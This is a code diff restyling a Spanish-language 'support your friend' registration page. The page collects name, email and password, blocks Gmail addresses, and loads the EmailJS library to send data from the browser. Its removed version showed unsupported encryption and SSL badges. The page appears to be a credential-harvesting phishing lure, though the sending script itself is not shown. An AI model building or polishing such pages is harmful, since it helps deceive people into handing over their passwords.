@@ -2,59 +2,45 @@
 <html lang="es">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Registro Premium | Apoya a tu Amigo</title>
-    <link rel="stylesheet" href="style.css">
-    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300;400;600;700&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Registro de Soporte</title>
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap">
+    <link rel="stylesheet" href="styles.css">
 </head>
 <body>
-    <div class="fondo-dinamico"></div>
-    
-    <main class="contenedor">
-        <div class="tarjeta-elevada">
-            <div class="cabecera">
-                <div class="icono-3d animate__animated animate__bounceIn">🎁</div>
-                <h1 class="titulo-gradiente">Potencia las oportunidades<br>de tu amigo</h1>
-                <p class="subtitulo-neon">Registro rápido y seguro</p>
+    <div class="container">
+        <div class="card">
+            <div class="header">
+                <div class="icon">🤝</div>
+                <h1>Apoya a tu amigo</h1>
+                <p class="subtitle">Registro rápido y seguro</p>
             </div>
 
-            <form id="formRegistro" class="formulario-moderno">
-                <div class="grupo-formulario">
-                    <label class="etiqueta-flotante">Nombre completo</label>
-                    <input type="text" id="nombre" class="input-material" required>
-                    <span class="icono-input">👤</span>
+            <form id="registrationForm">
+                <div class="input-group">
+                    <label>Nombre completo</label>
+                    <input type="text" id="fullName" required>
                 </div>
 
-                <div class="grupo-formulario">
-                    <label class="etiqueta-flotante">Correo electrónico</label>
-                    <input type="email" id="correo" class="input-material" required>
-                    <span class="icono-input">📩</span>
-                    <div class="mensaje-error" id="errorEmail">
-                        <span class="icono-error">⛔</span> Dominios Gmail no permitidos
-                    </div>
+                <div class="input-group">
+                    <label>Correo electrónico</label>
+                    <input type="email" id="email" required>
+                    <div class="error-message" id="emailError">Correos Gmail no permitidos</div>
                 </div>
 
-                <div class="grupo-formulario">
-                    <label class="etiqueta-flotante">Contraseña</label>
-                    <input type="password" id="password" class="input-material" required>
-                    <span class="icono-input">🔒</span>
+                <div class="input-group">
+                    <label>Contraseña</label>
+                    <input type="password" id="password" required>
                 </div>
 
-                <button type="submit" class="boton-neumorfico">
-                    <span class="texto-boton">Validar Registro</span>
-                    <div class="carga-efecto"></div>
+                <button type="submit" class="primary-button">
+                    <span>Continuar</span>
                 </button>
             </form>
-
-            <div class="info-seguridad">
-                <div class="icono-escudo">🛡️</div>
-                <p>Cifrado AES-256 | Certificado SSL</p>
-            </div>
         </div>
-    </main>
+    </div>
 
     <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
-    <script src="script.js"></script>
+    <script src="app.js"></script>
 </body>
 </html>
